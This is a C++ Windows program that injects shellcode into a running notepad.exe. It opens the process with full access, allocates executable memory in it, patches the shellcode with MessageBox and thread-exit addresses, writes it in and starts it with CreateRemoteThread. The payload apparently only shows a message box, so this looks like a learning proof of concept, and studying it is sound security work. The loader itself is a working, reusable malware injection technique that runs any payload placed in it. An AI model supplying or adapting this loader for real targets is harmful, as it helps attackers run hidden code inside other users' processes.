#include <Windows.h>
#include <TlHelp32.h>

#include <iostream>
using namespace std;

#include "process_thread.h"
#include "Payload.h"

int main() {
	Payload payload{};
	payload.FindFunctionAddress();

	ProcessThread target{ 0 };
	target.ProcessName = L"notepad.exe";
	NameToProcessId(&target);
	cout << target.dwProcessId << endl;

	target.hProcess.SetHandle(OpenProcess(PROCESS_ALL_ACCESS, FALSE, target.dwProcessId));
	LPVOID RemoteShellcode = VirtualAllocEx(target.hProcess.GetHandle(), 0, sizeof(payload.payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	LPVOID RemoteShellcodeAddress = (LPVOID)((DWORD64)RemoteShellcode + 0x100);

	*((ULONGLONG*)&payload.payload[0x11]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&payload.payload[0x1b]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&payload.payload[0x28]) = payload.FuncAddress.MessageBoxAddress;
	*((ULONGLONG*)&payload.payload[0x3b]) = payload.FuncAddress.RtlExitUserThreadAddress;

	WriteProcessMemory(target.hProcess.GetHandle(), RemoteShellcodeAddress, payload.payload, sizeof(payload.payload), NULL);

	target.hThread = CreateRemoteThread(
		target.hProcess.GetHandle(), 
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)RemoteShellcodeAddress, 
		NULL,
		0,
		&target.dwThreadId);
}